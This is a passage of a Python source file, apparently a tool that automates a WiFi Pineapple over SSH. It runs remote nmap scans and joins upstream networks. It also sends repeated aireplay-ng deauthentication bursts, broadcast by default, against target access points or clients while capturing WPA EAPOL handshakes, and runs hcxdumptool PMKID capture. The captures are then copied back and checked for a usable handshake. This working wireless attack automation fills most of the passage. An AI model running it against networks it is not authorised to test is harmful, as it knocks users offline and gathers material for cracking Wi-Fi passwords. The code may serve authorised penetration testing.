                svc_cmd = (
                    f'nmap -T4 -sV --version-light --open --reason -e {_q(iface)} '
                    f'-p {shlex.quote(port_nums)} -oX - {_q(host)}'
                )
                stage = _run_remote_nmap_stage(cfg, f'services:{host}', svc_cmd, timeout=240)
                commands_run.append(stage['cmd'])
                svc_stage_results.append(stage)
                raw_excerpts[f'services:{host}'] = (stage.get('stdout', '') or '')[-4000:]
                _write_stage_artifacts(capture_dir, artifacts_index, f'services_{host}', stage)
                if not stage['ok']:
                    failed_stages.append(f'services:{host}')
                    warnings.append(_best_stage_error(stage, f'Service detection failed on {host}'))
                    continue
                parsed = _parse_nmap_xml(stage.get('stdout', ''))
                if parsed.get('parser_warning'):
                    warnings.append(str(parsed['parser_warning']))
                for p_ip, svcs in parsed.get('services_by_host', {}).items():
                    service_results.append({'host': p_ip, 'services': svcs})
            stage_results['services'] = svc_stage_results

        # ── Stage 4: OS detection ──
        if 'os' in requested_stages and hosts_with_open_ports:
            os_cmd = (
                f'nmap -T4 -O --osscan-guess --reason -e {_q(iface)} '
                f'-oX - {_host_list_str(hosts_with_open_ports)}'
            )
            stage = _run_remote_nmap_stage(cfg, 'os', os_cmd, timeout=360)
            commands_run.append(stage['cmd'])
            stage_results['os'] = stage
            raw_excerpts['os'] = (stage.get('stdout', '') or '')[-6000:]
            _write_stage_artifacts(capture_dir, artifacts_index, 'os', stage)
            if not stage['ok']:
                failed_stages.append('os')
                warnings.append(_best_stage_error(stage, 'OS detection failed'))
            else:
                parsed = _parse_nmap_xml(stage.get('stdout', ''))
                if parsed.get('parser_warning'):
                    warnings.append(str(parsed['parser_warning']))
                detected = {}
                for p_ip, osinfo in parsed.get('os_by_host', {}).items():
                    os_results.append({'host': p_ip, **osinfo})
                    detected[p_ip] = True
                for h in hosts_with_open_ports:
                    if h not in detected:
                        os_results.append({
                            'host': h, 'matches': [], 'classes': [], 'best': None,
                            'note': 'OS not reliably detected',
                        })
        elif 'os' in requested_stages and host_ips and not hosts_with_open_ports:
            warnings.append(
                'OS detection was skipped because no hosts had open ports - '
                'OS fingerprinting is unreliable without open ports.'
            )

    return _finalize({
        'ok': True,
        'scan_origin': 'pineapple',
        'scan_interface': iface,
        'target': safe_target,
        'aggressive': aggressive,
        'stages_run': requested_stages,
        'connected_ip': connected_ip,
        'connected_gateway': connected_gateway,
        'connected_subnet': connected_subnet,
        'live_hosts': live_hosts,
        'port_scan_results': port_scan_results,
        'service_results': service_results,
        'os_results': os_results,
        'preflight': preflight,
        'warnings': warnings,
        'failed_stages': failed_stages,
        'commands_run': commands_run,
        'stages': stage_results,
        'raw_output_excerpts': raw_excerpts,
    })


def pineapple_connect(ssid: str, password: str, cfg: dict[str, Any]) -> dict[str, Any]:
    """Connect the Pineapple's client radio to an upstream AP.

    The WiFi Pineapple has multiple radios.  The client / upstream radio is
    typically wlan2 (radio2) - NOT wlan0, which hosts the Pineapple's own APs.
    This function:
      1. Finds the existing client-mode (sta) wifi-iface section, or uses the
         last radio's section as the client interface.
      2. Checks if wlan2 is already associated to the requested SSID.
      3. If not, reconfigures the client section and reloads wifi.
    """
    if not ssid:
        return {'ok': False, 'error': 'SSID is required'}

    # Step 1: Check if already connected to the requested SSID on wlan2.
    check = _run(cfg, 'iwinfo wlan2 info 2>/dev/null || true', timeout=10)
    check_out = check.get('stdout', '') or ''
    already_connected = False
    if f'ESSID: "{ssid}"' in check_out:
        already_connected = True

    if already_connected:
        # Extract IP info to report back
        ip_result = _run(cfg, 'ip addr show wlan2 2>/dev/null | grep inet; ip route show dev wlan2 2>/dev/null', timeout=10)
        return {
            'ok': True,
            'already_connected': True,
            'stdout': check_out + '\n' + (ip_result.get('stdout', '') or ''),
            'ssid': ssid,
            'interface': 'wlan2',
            'msg': f'Pineapple is already connected to {ssid} on wlan2.',
        }

    # Step 2: Find the client wifi-iface UCI section.
    # On Hak5 Pineapple, the client interface is typically the section for
    # radio2.  We look for the first iface with device=radio2, or fall back
    # to scanning for an existing sta-mode section.
    find_script = (
        "IDX=0; FOUND=''; "
        "while uci -q get wireless.@wifi-iface[$IDX] >/dev/null 2>&1; do "
        "  DEV=$(uci -q get wireless.@wifi-iface[$IDX].device); "
        "  MODE=$(uci -q get wireless.@wifi-iface[$IDX].mode); "
        "  if [ \"$DEV\" = 'radio2' ] || [ \"$MODE\" = 'sta' ]; then "
        "    FOUND=$IDX; break; "
        "  fi; "
        "  IDX=$((IDX+1)); "
        "done; "
        "echo $FOUND"
    )
    idx_result = _run(cfg, f'sh -c {shlex.quote(find_script)}', timeout=10)
    iface_idx = (idx_result.get('stdout', '') or '').strip()

    if not iface_idx:
        return {
            'ok': False,
            'error': 'Could not find the client radio UCI section (radio2 / sta mode). '
                     'The Pineapple may need manual wireless configuration.',
        }

    section = f'wireless.@wifi-iface[{iface_idx}]'
    connect_script = (
        f"uci set {section}.mode=sta; "
        f"uci set {section}.ssid={shlex.quote(ssid)}; "
        f"uci set {section}.key={shlex.quote(password or '')}; "
        f"uci set {section}.encryption=psk2; "
        f"uci set {section}.disabled=0; "
        f"uci commit wireless; wifi reload; "
        f"sleep 8; "
        f"iwinfo wlan2 info 2>/dev/null; "
        f"echo '---'; ip addr show wlan2 2>/dev/null | grep inet; "
        f"echo '---'; ip route show dev wlan2 2>/dev/null"
    )
    result = _run(cfg, f'sh -lc {shlex.quote(connect_script)}', timeout=60)
    stdout = result.get('stdout', '') or ''

    # Check if association succeeded
    connected = f'ESSID: "{ssid}"' in stdout
    result['ssid'] = ssid
    result['interface'] = 'wlan2'
    result['uci_section'] = section
    if connected:
        result['ok'] = True
        result['msg'] = f'Connected to {ssid} on wlan2.'
    elif not result.get('ok'):
        result['error'] = result.get('error') or f'wifi reload completed but wlan2 did not associate with {ssid}'
    return result


def enable_monitor_mode(cfg: dict[str, Any], interface: str = 'wlan1mon') -> dict[str, Any]:
    """
    Ensure the target interface is in monitor mode on the Pineapple.

    Tries three strategies in order:
    1. Interface already ends in 'mon' and is up - verify with iw dev.
    2. airmon-ng start on the base interface.
    3. Manual iw dev add + type monitor.

    Returns dict with ok, interface (final monitor interface name), and stdout.
    """
    script = (
        f'set -e; '
        # Check if the interface already exists and is in monitor mode
        f'if iw dev {shlex.quote(interface)} info 2>/dev/null | grep -q "type monitor"; then '
        f'  ip link set {shlex.quote(interface)} up 2>/dev/null || true; '
        f'  echo "MONITOR_OK:{interface}"; exit 0; '
        f'fi; '
        # Try airmon-ng on the base interface (strip 'mon' suffix to get physical iface)
        f'BASE=$(echo {shlex.quote(interface)} | sed "s/mon$//"); '
        f'if command -v airmon-ng >/dev/null 2>&1; then '
        f'  airmon-ng start "$BASE" 2>&1 || true; '
        f'  MON_IFACE=$(iw dev 2>/dev/null | awk \'/Interface/{{iface=$2}} /type monitor/{{print iface; exit}}\'); '
        f'  if [ -n "$MON_IFACE" ]; then '
        f'    ip link set "$MON_IFACE" up 2>/dev/null || true; '
        f'    echo "MONITOR_OK:$MON_IFACE"; exit 0; '
        f'  fi; '
        f'fi; '
        # Manual fallback: iw phy + iw dev add
        f'PHY=$(iw dev "$BASE" info 2>/dev/null | awk "/wiphy/{{print \"phy\"$2; exit}}"); '
        f'if [ -n "$PHY" ]; then '
        f'  iw dev "$BASE" del 2>/dev/null || true; '
        f'  iw phy "$PHY" interface add {shlex.quote(interface)} type monitor; '
        f'  ip link set {shlex.quote(interface)} up; '
        f'  echo "MONITOR_OK:{interface}"; exit 0; '
        f'fi; '
        f'echo "MONITOR_FAIL:{interface}"; exit 1'
    )
    result = _run(cfg, f'sh -lc {shlex.quote(script)}', timeout=30)
    # Strip ANSI escape sequences and decoration that some firmwares emit before
    # parsing. Without this, control codes or asterisks from MOTDs/airmon-ng can
    # leak into the captured interface name (e.g. "wlan1mon**").
    raw_combined = (result.get('stdout', '') or '') + (result.get('stderr', '') or '')
    raw_combined = re.sub(r'\x1b\[[0-9;]*[A-Za-z]', '', raw_combined)
    monitor_iface = interface
    # Strict character class - only allow valid Linux iface characters.
    m = re.search(r'MONITOR_OK:([A-Za-z0-9._\-]+)', raw_combined)
    if m:
        candidate = m.group(1).strip()
        if re.fullmatch(r'[A-Za-z0-9._\-]+', candidate):
            monitor_iface = candidate
    # Mark ok=True if we observed a MONITOR_OK marker, even if shell returned
    # non-zero from a downstream command (e.g. an info dump).
    if 'MONITOR_OK:' in raw_combined:
        result['ok'] = True
    result['interface'] = monitor_iface
    return result


def pineapple_deauth_and_capture(
    target_mac: str,
    bssid: str,
    channel: int,
    cfg: dict[str, Any],
    interface: str = 'wlan1mon',
    capture_seconds: int = 120,
    deauth_bursts: int = 10,
) -> dict[str, Any]:
    if not bssid:
        return {'ok': False, 'error': 'BSSID is required'}
    mac_re = r'^(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'
    bssid = bssid.strip().upper()
    bssid_lower = bssid.lower()
    target_mac = (target_mac or 'FF:FF:FF:FF:FF:FF').strip().upper()
    is_broadcast = target_mac == 'FF:FF:FF:FF:FF:FF'
    if not re.fullmatch(mac_re, bssid):
        return {'ok': False, 'error': f'Invalid BSSID: {bssid}'}
    if not re.fullmatch(mac_re, target_mac):
        return {'ok': False, 'error': f'Invalid target MAC: {target_mac}'}
    try:
        channel = int(channel)
        capture_seconds = max(30, int(capture_seconds))
        deauth_bursts = max(1, int(deauth_bursts))
    except Exception:
        return {'ok': False, 'error': 'Invalid numeric deauth parameters'}

    # Verify monitor mode before starting - fail fast rather than capture garbage.
    mon_result = enable_monitor_mode(cfg, interface=interface)
    if not mon_result.get('ok'):
        return {
            'ok': False,
            'error': f'Could not confirm monitor mode on {interface}: {mon_result.get("stderr", "")[:300]}',
            'monitor_check': mon_result,
        }

    _raw_lcd = str(_pine_cfg(cfg).get('local_capture_dir', '')).strip()
    local_capture_dir = _raw_lcd if _raw_lcd else str(Path(__file__).resolve().parent.parent / 'captures')
    Path(local_capture_dir).mkdir(parents=True, exist_ok=True)
    timestamp = int(time.time())
    safe_bssid = bssid.replace(':', '').lower()
    safe_target = target_mac.replace(':', '').lower()
    remote_pcap = f'/tmp/deauth_diag_{safe_bssid}_{safe_target}_{timestamp}.pcap'
    remote_aireplay_log = f'/tmp/deauth_diag_{safe_bssid}_{safe_target}_{timestamp}.aireplay.log'
    local_pcap = str(Path(local_capture_dir) / f'deauth_diag_{safe_bssid}_{safe_target}_ch{channel}_{timestamp}.pcap')
    local_aireplay_log = str(Path(local_capture_dir) / f'deauth_diag_{safe_bssid}_{safe_target}_ch{channel}_{timestamp}.aireplay.log')
    burst_interval = max(1, capture_seconds // deauth_bursts)

    # BPF filter: keep only frames involving the target BSSID (any address field).
    # 'ether host <mac>' on a monitor-mode interface matches any 802.11 address field.
    pcap_filter = f'ether host {bssid_lower}'

    # Build the aireplay-ng command. With `-0 N` (N>0), aireplay-ng exits on its
    # own after sending N deauth packets - no `timeout` wrapper required (and
    # `timeout` is not present in BusyBox on the Pineapple's shell). Targeted
    # deauth uses `-c <client>`; broadcast skips that flag entirely so we don't
    # wedge aireplay-ng with an FF:FF:FF:FF:FF:FF station argument.
    if is_broadcast:
        aireplay_invocation = (
            f'aireplay-ng -0 15 --ignore-negative-one '
            f'-a {shlex.quote(bssid)} {shlex.quote(interface)}'
        )
    else:
        aireplay_invocation = (
            f'aireplay-ng -0 15 --ignore-negative-one '
            f'-a {shlex.quote(bssid)} -c {shlex.quote(target_mac)} {shlex.quote(interface)}'
        )

    script = (
        'set -eu; '
        f'if ! command -v tcpdump >/dev/null 2>&1; then echo "ERROR:TCPDUMP_NOT_FOUND"; exit 2; fi; '
        f'if ! command -v aireplay-ng >/dev/null 2>&1; then echo "ERROR:AIREPLAY_NOT_FOUND"; exit 2; fi; '
        f'rm -f {shlex.quote(remote_pcap)} {shlex.quote(remote_aireplay_log)}; '
        f'iw dev {shlex.quote(interface)} set channel {channel}; '
        # Start tcpdump in background; -U flushes each packet immediately.
        f'tcpdump -i {shlex.quote(interface)} -U -s 0 -w {shlex.quote(remote_pcap)} {shlex.quote(pcap_filter)} >> {shlex.quote(remote_aireplay_log)} 2>&1 & '
        'TCPDUMP_PID=$!; '
        # Wait up to 5 s for the pcap file to appear before deauthing.
        f'WAITED=0; while [ ! -e {shlex.quote(remote_pcap)} ] && [ "$WAITED" -lt 5 ]; do sleep 1; WAITED=$((WAITED+1)); done; '
        'i=0; '
        f'while [ "$i" -lt {deauth_bursts} ]; do '
        f'echo "=== burst:$i ts:$(date +%s) ===" >> {shlex.quote(remote_aireplay_log)}; '
        # aireplay-ng with -0 15 self-terminates after 15 frames; no `timeout` needed.
        f'{aireplay_invocation} >> {shlex.quote(remote_aireplay_log)} 2>&1 || true; '
        'i=$((i+1)); '
        f'sleep {burst_interval}; '
        'done; '
        'sleep 8; '
        'kill -INT "$TCPDUMP_PID" 2>/dev/null || true; '
        'sleep 2; '
        'wait "$TCPDUMP_PID" 2>/dev/null || true; '
        f'test -e {shlex.quote(remote_pcap)}; ls -l {shlex.quote(remote_pcap)}; '
        'echo __AIREPLAY_LOG_START__; '
        f'cat {shlex.quote(remote_aireplay_log)} 2>/dev/null || true; '
        'echo __AIREPLAY_LOG_END__'
    )
    run_result = _run(cfg, f'sh -lc {shlex.quote(script)}', timeout=capture_seconds + 180)
    _combined = (run_result.get('stdout', '') or '') + (run_result.get('stderr', '') or '')
    if 'ERROR:AIREPLAY_NOT_FOUND' in _combined:
        return {
            'ok': False,
            'error': 'aireplay-ng is not installed or not in PATH on the Pineapple. Install the aircrack-ng suite.',
            'failure_type': 'dependency_missing',
            'dependency': 'aireplay-ng',
            'bssid': bssid, 'channel': channel,
        }
    if 'ERROR:TCPDUMP_NOT_FOUND' in _combined:
        return {
            'ok': False,
            'error': 'tcpdump is not installed or not in PATH on the Pineapple.',
            'failure_type': 'dependency_missing',
            'dependency': 'tcpdump',
            'bssid': bssid, 'channel': channel,
        }
    if not run_result.get('ok'):
        return {
            'ok': False,
            'error': run_result.get('error') or 'remote deauth/capture command failed',
            'failure_type': 'remote_command_failure',
            'bssid': bssid,
            'target_mac': target_mac,
            'channel': channel,
            'interface': interface,
            'remote_pcap': remote_pcap,
            'remote_aireplay_log': remote_aireplay_log,
            'run_result': run_result,
        }

    scp_result = _scp_from_remote(cfg, remote_pcap, local_pcap, timeout=90)
    aireplay_log_scp = _scp_from_remote(cfg, remote_aireplay_log, local_aireplay_log, timeout=60)
    _run(cfg, f'rm -f {shlex.quote(remote_pcap)} {shlex.quote(remote_aireplay_log)} 2>/dev/null || true', timeout=10)
    if not scp_result.get('ok'):
        return {
            'ok': False,
            'error': 'capture completed but copy failed',
            'remote_pcap': remote_pcap,
            'remote_aireplay_log': remote_aireplay_log,
            'pcap_path': local_pcap,
            'aireplay_log_path': local_aireplay_log if aireplay_log_scp.get('ok') else None,
            'bssid': bssid,
            'target_mac': target_mac,
            'channel': channel,
            'interface': interface,
            'run_result': run_result,
            'scp_result': scp_result,
            'aireplay_log_scp': aireplay_log_scp,
        }
    local_file = Path(local_pcap)
    if not local_file.exists():
        return {'ok': False, 'error': 'copied capture file is missing', 'pcap_path': local_pcap}
    size_bytes = local_file.stat().st_size

    def _count(display_filter: str) -> int:
        proc = subprocess.run(
            ['tshark', '-r', local_pcap, '-Y', display_filter, '-T', 'fields', '-e', 'frame.number'],
            text=True, capture_output=True, timeout=30, check=False,
        )
        return len([ln for ln in (proc.stdout or '').splitlines() if ln.strip()])

    # Count EAPOL only for this specific BSSID - avoids false positives from
    # ambient WPA handshakes on the same channel from unrelated networks.
    eapol_count = _count(f'eapol && wlan.bssid == {bssid_lower}')
    assoc_count = _count('wlan.fc.type == 0 && (wlan.fc.type_subtype == 0 || wlan.fc.type_subtype == 1 || wlan.fc.type_subtype == 2 || wlan.fc.type_subtype == 3)')
    auth_count = _count('wlan.fc.type == 0 && wlan.fc.type_subtype == 11')
    deauth_count = _count('wlan.fc.type == 0 && wlan.fc.type_subtype == 12')
    disassoc_count = _count('wlan.fc.type == 0 && wlan.fc.type_subtype == 10')
    probe_count = _count('wlan.fc.type == 0 && (wlan.fc.type_subtype == 4 || wlan.fc.type_subtype == 5)')

    aireplay_log_text = (
        Path(local_aireplay_log).read_text(errors='replace')[-30000:]
        if aireplay_log_scp.get('ok') and Path(local_aireplay_log).exists()
        else ''
    )

    # aireplay-ng output format: "Sending 15 directed DeAuth (code 7). STMAC: [AA:BB:CC:DD:EE:FF] [14|15 ACKs]"
    ack_matches = re.findall(r'\[(\d+)\|(\d+)\s+ACKs?\]', aireplay_log_text, re.IGNORECASE)
    ack_summary = []
    for a, b in ack_matches[-20:]:
        try:
            ack_summary.append({'acked': int(a), 'sent': int(b)})
        except ValueError:
            pass

    # Detect specific remote-side execution failures from the aireplay log so the
    # caller can distinguish a real "no handshake" outcome from a broken script.
    remote_shell_dep_missing = 'sh: timeout: not found' in aireplay_log_text
    aireplay_never_ran = (
        not ack_summary
        and ('aireplay-ng' not in aireplay_log_text)
        and ('Sending' not in aireplay_log_text)
    )
    pcap_header_only = size_bytes <= 24

    # Require at least 2 EAPOL frames - a single frame is not a complete handshake.
    handshake_ok = eapol_count >= 2
    if handshake_ok:
        outcome = 'handshake_captured'
    elif eapol_count == 1:
        outcome = 'partial_eapol'
    elif remote_shell_dep_missing:
        outcome = 'remote_shell_dependency_missing'
    elif aireplay_never_ran and pcap_header_only:
        outcome = 'deauth_loop_failed'
    elif pcap_header_only and deauth_count == 0:
        outcome = 'empty_filtered_capture'
    elif assoc_count or auth_count:
        outcome = 'reconnect_observed'
    elif deauth_count > 0:
        outcome = 'deauth_transmitted_no_reconnect'
    else:
        outcome = 'insufficient_capture'

    ok = handshake_ok
    if ok:
        error = None
    elif outcome == 'partial_eapol':
        error = f'only {eapol_count} EAPOL frame(s) captured - need >= 2 for a usable handshake'
    elif outcome == 'remote_shell_dependency_missing':
        error = (
            "remote shell is missing the `timeout` command - deauth bursts did not run. "
            "This is a script-side issue and not a real wireless failure."
        )
    elif outcome == 'deauth_loop_failed':
        error = (
            "deauth loop did not actually execute on the Pineapple "
            "(no aireplay-ng output, capture is header-only)."
        )
    elif outcome == 'empty_filtered_capture':
        error = (
            f'filtered capture is empty ({size_bytes} bytes - pcap header only). '
            'No frames involving the target BSSID were written.'
        )
    elif outcome == 'reconnect_observed':
        error = 'reconnect activity observed (assoc/auth) but no EAPOL frames from target BSSID'
    elif outcome == 'deauth_transmitted_no_reconnect':
        error = (
            'deauth frames were transmitted but no client reconnect or EAPOL was captured. '
            'Possible causes: PMF/802.11w on the AP, no clients connected, or clients reconnected on a different channel. '
            'Consider hcxdumptool_capture for PMKID.'
        )
    else:
        error = f'capture file lacked useful activity ({size_bytes} bytes)'
    failure_type = (
        None if ok
        else 'remote_shell_dependency_missing' if outcome == 'remote_shell_dependency_missing'
        else 'deauth_loop_failed' if outcome == 'deauth_loop_failed'
        else 'empty_filtered_capture' if outcome == 'empty_filtered_capture'
        else 'no_handshake'
    )
    return {
        'ok': ok,
        'error': error,
        'outcome': outcome,
        'failure_type': failure_type,
        'used_broadcast': is_broadcast,
        'remote_pcap': remote_pcap,
        'remote_aireplay_log': remote_aireplay_log,
        'local_pcap': local_pcap,
        'pcap_path': local_pcap,
        'aireplay_log_path': local_aireplay_log if aireplay_log_scp.get('ok') else None,
        'bssid': bssid,
        'target_mac': target_mac,
        'channel': channel,
        'interface': interface,
        'size_bytes': size_bytes,
        'eapol_count': eapol_count,
        'assoc_count': assoc_count,
        'auth_count': auth_count,
        'deauth_count': deauth_count,
        'disassoc_count': disassoc_count,
        'probe_count': probe_count,
        'capture_seconds': capture_seconds,
        'deauth_bursts': deauth_bursts,
        'aireplay_ack_summary': ack_summary,
        'aireplay_log_excerpt': aireplay_log_text[-8000:],
        'run_result': run_result,
        'scp_result': scp_result,
        'aireplay_log_scp': aireplay_log_scp,
    }


def pineapple_deauth_and_capture_hcx(
    bssid: str,
    channel: int,
    cfg: dict[str, Any],
    interface: str = 'wlan1',
    capture_seconds: int = 180,
) -> dict[str, Any]:
    """HCX/PMKID capture using hcxdumptool.

    hcxdumptool manages its own monitor mode internally. Passing a virtual
    monitor interface created by airmon-ng (e.g. wlan1mon) is discouraged by
    upstream guidance and can cause silent capture failures. This function
    defaults to the physical interface (wlan1) and warns if a 'mon' suffix
    interface is used.
    """

    if not bssid:
        return {'ok': False, 'error': 'BSSID is required'}
    mac_re = r'^(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'
    bssid = bssid.strip().upper()
    bssid_lower = bssid.lower()
    if not re.fullmatch(mac_re, bssid):
        return {'ok': False, 'error': f'Invalid BSSID: {bssid}'}
    try:
        channel = int(channel)
        capture_seconds = max(30, int(capture_seconds))
    except Exception:
        return {'ok': False, 'error': 'Invalid numeric parameters'}

    # hcxdumptool manages monitor mode on the physical interface. If the caller
    # passed a virtual mon interface (wlan1mon), strip to the physical name.
    used_mon_interface = interface.endswith('mon')
    if used_mon_interface:
        physical = re.sub(r'mon$', '', interface)
        interface = physical if physical else interface

    # ── Interface preparation ──
    # Prior airmon-ng runs may have created a stale <iface>mon virtual interface
    # that blocks the physical radio and leaves <iface> DOWN. hcxdumptool cannot
    # transmit on a DOWN interface ("Network is down"). Clean up:
    #   1. Delete the stale virtual monitor interface if it exists
    #   2. Bring the physical interface down → set monitor mode → bring it up
    mon_vif = f'{interface}mon'
    prep_cmd = (
        f'iw dev {shlex.quote(mon_vif)} del 2>/dev/null || true; '
        f'ip link set {shlex.quote(interface)} down 2>/dev/null; '
        f'iw dev {shlex.quote(interface)} set type monitor 2>/dev/null; '
        f'ip link set {shlex.quote(interface)} up; '
        f'iw dev {shlex.quote(interface)} set channel {channel} 2>/dev/null || true; '
        f'iw dev {shlex.quote(interface)} info 2>/dev/null'
    )
    prep_result = _run(cfg, f'sh -lc {shlex.quote(prep_cmd)}', timeout=15)
    _prep_out = (prep_result.get('stdout', '') or '')
    if 'type monitor' not in _prep_out:
        return {
            'ok': False,
            'capture_ok': False,
            'error': (
                f'Could not prepare {interface} for hcxdumptool: '
                f'interface is not in monitor mode after preparation. '
                f'Output: {_prep_out[:300]}'
            ),
            'failure_type': 'interface_prep_failure',
            'bssid': bssid, 'channel': channel, 'interface': interface,
        }

    _raw_lcd2 = str(_pine_cfg(cfg).get('local_capture_dir', '')).strip()
    local_capture_dir = _raw_lcd2 if _raw_lcd2 else str(Path(__file__).resolve().parent.parent / 'captures')
    Path(local_capture_dir).mkdir(parents=True, exist_ok=True)
    timestamp = int(time.time())
    safe_bssid = bssid.replace(':', '').lower()
    remote_pcapng = f'/tmp/hcx_{safe_bssid}_{timestamp}.pcapng'
    local_pcapng = str(Path(local_capture_dir) / f'hcx_{safe_bssid}_ch{channel}_{timestamp}.pcapng')


    remote_log = f'/tmp/hcx_{safe_bssid}_{timestamp}.log'
    version_probe = _run(cfg, 'hcxdumptool --version 2>&1 | head -5 || echo NO_HCX', timeout=8)
    version_text = (version_probe.get('stdout', '') or '') + (version_probe.get('stderr', '') or '')
    if 'NO_HCX' in version_text or 'not found' in version_text.lower():
        return {
            'ok': False,
            'error': 'hcxdumptool is not installed or not in PATH on the Pineapple. Install hcxdumptool or use pineapple_deauth_and_capture instead.',
            'failure_type': 'dependency_missing',
            'dependency': 'hcxdumptool',
            'bssid': bssid, 'channel': channel,
        }

    help_probe = _run(cfg, 'hcxdumptool -h 2>&1 | head -200 || hcxdumptool --help 2>&1 | head -200 || true', timeout=8)
    help_text = (help_probe.get('stdout', '') or '') + (help_probe.get('stderr', '') or '')
    # Modern hcxdumptool (>=6.x) uses -w for output; older uses -o.
    if re.search(r'(^|\s)-w\s', help_text):
        out_flag = '-w'
    else:
        out_flag = '-o'

    # BSSID targeting: modern hcxdumptool supports --filterlist_ap to restrict
    # capture to specific APs. Without it, hcxdumptool captures from ALL nearby
    # networks on the channel, making the result unreliable for single-target use.
    bssid_filter_applied = False
    filter_file = f'/tmp/hcx_filter_{safe_bssid}.txt'
    # -c {channel} locks hcxdumptool to a single channel (no hopping).
    channel_flag = f'-c {channel}'
    if re.search(r'filterlist_ap', help_text):
        bssid_filter_applied = True
        hcx_cmd = (
            f'hcxdumptool -i {shlex.quote(interface)} {out_flag} {shlex.quote(remote_pcapng)}'
            f' {channel_flag}'
            f' --filterlist_ap={shlex.quote(filter_file)} --filtermode=2'
        )
    else:
        hcx_cmd = (
            f'hcxdumptool -i {shlex.quote(interface)} {out_flag} {shlex.quote(remote_pcapng)}'
            f' {channel_flag}'
        )

    # Bounded background launch - guarantees hcxdumptool cannot run longer than
    # capture_seconds, and cannot hang the SSH session no matter which version
    # is installed or which flags it supports.
    script = (
        'set -u; '
        f'if ! command -v hcxdumptool >/dev/null 2>&1; then echo "ERROR:HCXDUMPTOOL_NOT_FOUND"; exit 2; fi; '
        f'rm -f {shlex.quote(remote_pcapng)} {shlex.quote(remote_log)}; '
        # Write BSSID filter file (lowercase MAC, no colons) for --filterlist_ap
        f'echo {shlex.quote(safe_bssid)} > {shlex.quote(filter_file)}; '
        f'( {hcx_cmd} >> {shlex.quote(remote_log)} 2>&1 ) & '
        'HCX_PID=$!; '
        f'SLEPT=0; while [ "$SLEPT" -lt {capture_seconds} ]; do '
        '  if ! kill -0 "$HCX_PID" 2>/dev/null; then break; fi; '
        '  sleep 1; SLEPT=$((SLEPT+1)); '
        'done; '
        'kill -INT "$HCX_PID" 2>/dev/null || true; '
        'sleep 2; '
        'kill -TERM "$HCX_PID" 2>/dev/null || true; '
        'wait "$HCX_PID" 2>/dev/null || true; '
        f'echo __HCX_LOG_START__; tail -40 {shlex.quote(remote_log)} 2>/dev/null || true; echo __HCX_LOG_END__; '
        f'ls -l {shlex.quote(remote_pcapng)} 2>/dev/null || true'
    )
    # Hard SSH ceiling = capture_seconds + 30 s of guaranteed cleanup budget.
    run_result = _run(cfg, f'sh -lc {shlex.quote(script)}', timeout=capture_seconds + 30)
    _hcx_combined = (run_result.get('stdout', '') or '') + (run_result.get('stderr', '') or '')
    if 'ERROR:HCXDUMPTOOL_NOT_FOUND' in _hcx_combined:
        return {
            'ok': False,
            'error': 'hcxdumptool is not installed or not in PATH on the Pineapple. Install hcxdumptool or use pineapple_deauth_and_capture instead.',
            'failure_type': 'dependency_missing',
            'dependency': 'hcxdumptool',
            'bssid': bssid, 'channel': channel,
        }
    # Treat the run as "ok enough" if we observed our log markers - the wrapper
    # script always exits 0 unless SSH transport itself failed.
    saw_markers = ('__HCX_LOG_START__' in _hcx_combined) or ('__HCX_LOG_END__' in _hcx_combined)
    if not run_result.get('ok') and not saw_markers:
        return {
            'ok': False,
            'error': run_result.get('error') or 'hcxdumptool capture failed (transport)',
            'failure_type': 'transport_failure',
            'bssid': bssid,
            'channel': channel,
            'interface': interface,
            'run_result': run_result,
        }

    # ── Radio / transmit failure detection ──
    # Extract the hcxdumptool log section from the combined output.
    _hcx_log = ''
    _log_start = _hcx_combined.find('__HCX_LOG_START__')
    _log_end = _hcx_combined.find('__HCX_LOG_END__')
    if _log_start != -1 and _log_end != -1:
        _hcx_log = _hcx_combined[_log_start + len('__HCX_LOG_START__'):_log_end]
    elif _log_start != -1:
        _hcx_log = _hcx_combined[_log_start + len('__HCX_LOG_START__'):]

    _radio_failure_patterns = [
        'network is down',
        'failed to transmit',
        'maximum number of errors',
        'can not sniff on interface',
        'interface not available',
        'failed to set channel',
        'ioctl(siocgifindex)',
        'device or resource busy',
    ]
    _hcx_log_lower = _hcx_log.lower()
    _radio_failures_found = [p for p in _radio_failure_patterns if p in _hcx_log_lower]
    if _radio_failures_found:
        # Still attempt SCP in case a partial capture file exists, but
        # classify the outcome as a radio failure regardless.
        scp_result = _scp_from_remote(cfg, remote_pcapng, local_pcapng, timeout=120)
        _run(cfg, f'rm -f {shlex.quote(remote_pcapng)} 2>/dev/null || true', timeout=10)
        return {
            'ok': False,
            'capture_ok': False,
            'error': (
                f'hcxdumptool encountered a radio/driver failure on {interface}: '
                + '; '.join(_radio_failures_found[:3])
                + '. The wireless interface may be down, busy, or incompatible with hcxdumptool.'
            ),
            'failure_type': 'radio_failure',
            'radio_failure_indicators': _radio_failures_found,
            'hcx_log_tail': _hcx_log.strip()[-500:],
            'bssid_filter_applied': bssid_filter_applied,
            'used_mon_interface': used_mon_interface,
            'bssid': bssid,
            'channel': channel,
            'interface': interface,
            'capture_seconds': capture_seconds,
            'pcap_path': local_pcapng if Path(local_pcapng).exists() else None,
        }

    scp_result = _scp_from_remote(cfg, remote_pcapng, local_pcapng, timeout=120)
    _run(cfg, f'rm -f {shlex.quote(remote_pcapng)} 2>/dev/null || true', timeout=10)
    if not scp_result.get('ok'):
        return {
            'ok': False,
            'error': 'hcxdumptool capture completed but SCP failed',
            'bssid': bssid,
            'channel': channel,
            'remote_pcapng': remote_pcapng,
            'scp_result': scp_result,
        }

    local_file = Path(local_pcapng)
    if not local_file.exists():
        return {'ok': False, 'error': 'copied hcxdumptool pcapng is missing', 'pcap_path': local_pcapng}
    size_bytes = local_file.stat().st_size

    def _count(display_filter: str) -> int:
        proc = subprocess.run(
            ['tshark', '-r', local_pcapng, '-Y', display_filter, '-T', 'fields', '-e', 'frame.number'],
            text=True, capture_output=True, timeout=30, check=False,
        )
        return len([ln for ln in (proc.stdout or '').splitlines() if ln.strip()])

    eapol_count = _count(f'eapol && wlan.bssid == {bssid_lower}')
    handshake_ok = eapol_count >= 2

    if handshake_ok:
        outcome = 'handshake_captured'
    elif eapol_count == 1:
        outcome = 'partial_eapol'
    elif size_bytes > 200:
        outcome = 'no_eapol_pmkid_extraction_required'
    else:
        outcome = 'empty_capture'

    return {
        'capture_ok': outcome != 'empty_capture',
        'ok': handshake_ok,
        'error': (
            None if handshake_ok
